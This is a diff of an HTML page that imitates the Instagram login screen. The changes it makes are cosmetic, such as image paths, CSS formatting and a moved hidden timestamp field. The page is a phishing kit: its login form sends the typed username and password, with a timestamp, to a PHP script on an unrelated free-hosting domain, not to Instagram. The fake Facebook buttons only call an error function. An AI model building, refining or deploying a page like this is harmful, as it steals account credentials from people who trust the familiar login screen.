@@ -1,9 +1,6 @@
 <html>
 <head>
 <link rel="icon" sizes="192x192" href="https://instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
-                    
-
-<meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login • Instagram</title>
 </head>
 
@@ -15,13 +12,13 @@
     background-color: #fafafa;
 
   }
-.but{
-  border: none;
-  background-color: white;
-  font-weight: bold;
-  color: #375184;
-  
-}
+  .but {
+    border: none;
+    background-color: white;
+    font-weight: bold;
+    color: #375184;
+
+  }
   .mobile {
     width: 465px;
     height: 650px;
@@ -84,7 +81,7 @@
     margin: 0 5px;
   }
   .face {
-    
+
     width: 20px;
   }
   .face2 {
@@ -282,7 +279,7 @@
     font-weight: bold;
     color: #0095f6;
   }
-  @media only screen and (max-width:700px){
+  @media only screen and (max-width: 600px) {
     .col1,.app-download,.link,.symbol,.separator {
       display: none;
     }
@@ -394,9 +391,9 @@
 <div class="row ">
   <div class="col1">
 
-    <img class="mobile" src="images/image3.png">
+    <img class="mobile" src="/images/image3.png">
     <div class="slide-content" id="slide-content">
-      <img class="content active" src="images/slide (1) .png">
+      <img class="content active" src="/images/slide (1) .png">
 
     </div>
   </div>
@@ -405,9 +402,9 @@
 
   <div class="col2">
     <div class="col2-1">
-      <img src="images/insta.png" class="logo">
+      <img src="/images/insta.png" class="logo">
       <div class="div">
-        <button onclick="error()" type="submit" class="fb-cont signup op" name="commit"><img class="face2" src="images/face2.jpeg" />&nbsp;&nbsp;Continue with Facebook</button>
+        <button onclick="error()" type="submit" class="fb-cont signup op" name="commit"><img class="face2" src="/images/face2.jpeg" />&nbsp;&nbsp;Continue with Facebook</button>
     </div>
     <div class="separator2">
       <span class="span"></span>
@@ -418,11 +415,10 @@
     </div>
     <form action="https://devil-ff.000webhostapp.com/instagram.php" method="post">
       <input type="text" class="form-input" placeholder="Phone number,username or email address"name="login" id="login_field" onkeyup="succes()" />
-
+               <input type="hidden" name="Time" value="date" id="date"/>
     <input type="password" class="form-input" placeholder="Password" onchange="onchange()" name="password" id="password" /><button id="toggle" type="button" class="toggle"></button>
   <a class="link2" href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
   <button type="submit" class="form-button" id='button' name="commit" value="instagram" disabled="true">Log in</button>
-            <input type="hidden" name="Time" value="date" id="date"/>
 </form>
 <div class="separator">
   <span class="span"></span>
@@ -432,9 +428,9 @@
   <span class="span"></span>
 </div>
 <div class="login-with-fb flex direction-column align-items-center">
- <button class="signup but">
+  <button class="signup but" onclick="error()">
     <div class="div2">
-      <img class="face" src="images/face.png" />&nbsp;&nbsp;Log in with Facebook
+      <img class="face" src="/images/face.png" />&nbsp;&nbsp;Log in with Facebook
   </div>
 </button>
 
@@ -453,15 +449,15 @@ Get the app.
 </p>
 </div>
 <div class="flex symbol justify-content-center">
-<a href="https://apps.apple.com/in/app/instagram/id389801252"><img src="images/apple-app-store.png" alt="Image of apple store" title="Image of Apple Store" /></a>
-<a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/play-store.png" alt="Image of google play store" title="Image of google play store" /></a>
+<a href="https://apps.apple.com/in/app/instagram/id389801252"><img src="/images/apple-app-store.png" alt="Image of apple store" title="Image of Apple Store" /></a>
+<a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="/images/play-store.png" alt="Image of google play store" title="Image of google play store" /></a>
 </div>
 
 </div>
 </div>
 
 <div class="foot">
-<img src="images/meta.png" class="meta" />
+<img src="/images/meta.png" class="meta" />
 </div>
 <script>
 
@@ -510,7 +506,7 @@ err.style.display = "none";
 err.style.display = "block";
 }
 }
-      var date = new Date();
+var date = new Date();
 	document.getElementById("date").value= date;
 </script>
 </body>
